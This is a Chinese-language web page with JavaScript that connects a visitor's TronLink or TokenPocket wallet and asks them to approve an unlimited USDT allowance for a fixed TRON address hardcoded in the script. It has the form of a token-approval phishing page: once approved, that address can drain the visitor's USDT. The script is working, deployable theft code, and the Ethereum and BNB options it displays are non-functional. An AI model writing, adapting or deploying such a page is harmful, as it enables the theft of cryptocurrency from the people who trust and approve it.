<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>多链钱包授权 - USDT无限授权</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        
        .wallet-item.selected {
            border-color: #667eea;
            background: #f8f9ff;
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        
        .wallet-chains {
            font-size: 12px;
            color: #999;
        }
        
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .approve-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .download-prompt {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 16px;
            border-radius: 16px;
            text-align: center;
            animation: slideUp 0.3s ease;
            z-index: 1000;
        }
        
        .download-prompt a {
            color: #667eea;
            text-decoration: underline;
            margin-left: 8px;
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        .hidden {
            display: none;
        }
        
        .wallet-status {
            font-size: 12px;
            color: #999;
            margin-top: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">TRON 链 - USDT 无限额度授权</div>
            
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
                <button class="chain-btn active" data-chain="728126428">TRON</button>
            </div>
            
            <div class="wallet-list" id="walletList"></div>
            
            <div style="background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px;">
                <div style="font-size: 12px; color: #666;">授权地址</div>
                <div style="font-size: 12px; color: #333; word-break: break-all;">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                <div style="font-size: 12px; color: #666; margin-top: 8px;">授权额度</div>
                <div style="font-size: 14px; color: #667eea; font-weight: 600;">无限额度 (2^256-1)</div>
            </div>
            
            <button class="approve-btn" id="approveBtn">授权 USDT</button>
            <div class="status hidden" id="status"></div>
            <div class="wallet-status" id="walletStatus">等待选择钱包...</div>
        </div>
    </div>
    
    <div id="downloadPrompt" class="download-prompt hidden"></div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script>
        // ==================== 配置 ====================
        const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        // TRON 钱包列表
        const tronWallets = {
            tronlink: {
                name: 'TronLink',
                icon: '🌊',
                check: () => typeof window.tronLink !== 'undefined',
                download: {
                    ios: 'https://apps.apple.com/app/tronlink/id1514876309',
                    android: 'https://play.google.com/store/apps/details?id=com.tronlinkapp.wallet',
                    fallback: 'https://www.tronlink.org/'
                }
            },
            tokenpocket: {
                name: 'TokenPocket',
                icon: '🎫',
                check: () => typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress,
                download: {
                    ios: 'https://apps.apple.com/app/tokenpocket/id1389003581',
                    android: 'https://play.google.com/store/apps/details?id=com.vpaly.tokenpocket',
                    fallback: 'https://www.tokenpocket.pro/'
                }
            }
        };
        
        let selectedWallet = null;
        let tronWebInstance = null;
        
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function updateWalletStatus(text) {
            document.getElementById('walletStatus').textContent = text;
        }
        
        function showDownloadPrompt(wallet) {
            const prompt = document.getElementById('downloadPrompt');
            const ua = navigator.userAgent;
            let downloadUrl = wallet.download.fallback;
            if (/iPhone|iPad/i.test(ua)) downloadUrl = wallet.download.ios;
            if (/Android/i.test(ua)) downloadUrl = wallet.download.android;
            
            prompt.innerHTML = `
                未检测到 ${wallet.name}<br>
                <a href="${downloadUrl}" target="_blank" style="color: #667eea;">点击下载钱包</a>
                <span style="margin-left: 12px; cursor: pointer;" onclick="closeDownloadPrompt()">✕</span>
            `;
            prompt.classList.remove('hidden');
            setTimeout(() => closeDownloadPrompt(), 5000);
        }
        
        function closeDownloadPrompt() {
            document.getElementById('downloadPrompt').classList.add('hidden');
        }
        
        // ==================== 连接钱包 ====================
        async function connectWallet() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return false;
            }
            
            const wallet = tronWallets[selectedWallet];
            
            // 检查钱包是否安装
            if (!wallet.check()) {
                hideStatus();
                showDownloadPrompt(wallet);
                return false;
            }
            
            updateWalletStatus('正在连接钱包...');
            
            try {
                if (selectedWallet === 'tronlink') {
                    // TronLink 连接
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    tronWebInstance = window.tronLink.tronWeb;
                    const address = tronWebInstance.defaultAddress.base58;
                    updateWalletStatus(`已连接: ${address.slice(0, 6)}...${address.slice(-4)}`);
                    return true;
                    
                } else if (selectedWallet === 'tokenpocket') {
                    // TokenPocket 连接
                    if (window.tronWeb && window.tronWeb.defaultAddress) {
                        tronWebInstance = window.tronWeb;
                        const address = tronWebInstance.defaultAddress.base58;
                        updateWalletStatus(`已连接: ${address.slice(0, 6)}...${address.slice(-4)}`);
                        return true;
                    }
                }
                return false;
                
            } catch (error) {
                console.error('连接失败:', error);
                updateWalletStatus('连接失败，请重试');
                showStatus('连接钱包失败: ' + error.message, 'error');
                return false;
            }
        }
        
        // ==================== 授权 USDT ====================
        async function approveUSDT() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return;
            }
            
            // 先连接钱包
            const connected = await connectWallet();
            if (!connected) return;
            
            showStatus('正在构造授权交易...', 'loading');
            updateWalletStatus('正在请求授权...');
            
            try {
                // 获取 USDT 合约
                const contract = await tronWebInstance.contract().at(TRON_USDT_CONTRACT);
                
                // 调用 approve 方法
                showStatus('请在钱包中确认授权...', 'loading');
                
                const result = await contract.approve(
                    SPENDER_ADDRESS,
                    UNLIMITED_AMOUNT
                ).send();
                
                console.log('授权结果:', result);
                
                if (result && (result.result || result.txid)) {
                    const txid = result.txid || result;
                    showStatus(`✅ 授权成功！交易ID: ${txid.slice(0, 10)}...`, 'success');
                    updateWalletStatus('授权成功！');
                } else {
                    showStatus('授权失败，请重试', 'error');
                    updateWalletStatus('授权失败');
                }
                
            } catch (error) {
                console.error('授权错误:', error);
                if (error.message.includes('denied') || error.message.includes('reject') || error.message.includes('cancelled')) {
                    showStatus('用户取消了授权', 'error');
                    updateWalletStatus('已取消授权');
                } else {
                    showStatus('授权失败: ' + (error.message || '未知错误'), 'error');
                    updateWalletStatus('授权失败');
                }
            }
        }
        
        // ==================== 渲染钱包列表 ====================
        function renderWalletList() {
            const container = document.getElementById('walletList');
            container.innerHTML = Object.entries(tronWallets).map(([key, wallet]) => `
                <div class="wallet-item" data-wallet="${key}">
                    <div class="wallet-icon">${wallet.icon}</div>
                    <div class="wallet-info">
                        <div class="wallet-name">${wallet.name}</div>
                        <div class="wallet-chains">TRON</div>
                    </div>
                </div>
            `).join('');
            
            document.querySelectorAll('.wallet-item').forEach(item => {
                item.addEventListener('click', async () => {
                    selectedWallet = item.dataset.wallet;
                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                    item.classList.add('selected');
                    hideStatus();
                    updateWalletStatus(`已选择 ${tronWallets[selectedWallet].name}，点击授权按钮`);
                    
                    // 预检查钱包是否安装
                    const wallet = tronWallets[selectedWallet];
                    if (!wallet.check()) {
                        updateWalletStatus(`${wallet.name} 未安装，点击授权会提示下载`);
                    } else {
                        updateWalletStatus(`${wallet.name} 已就绪`);
                    }
                });
            });
        }
        
        // ==================== 初始化 ====================
        function init() {
            document.getElementById('approveBtn').addEventListener('click', approveUSDT);
            renderWalletList();
            
            // 检查是否有已安装的钱包
            if (typeof window.tronLink !== 'undefined') {
                updateWalletStatus('检测到 TronLink，选择后可直接授权');
            } else if (window.tronWeb && window.tronWeb.defaultAddress) {
                updateWalletStatus('检测到 TokenPocket，选择后可直接授权');
            } else {
                updateWalletStatus('未检测到钱包，请先选择并安装');
            }
        }
        
        init();
    </script>
</body>
</html>
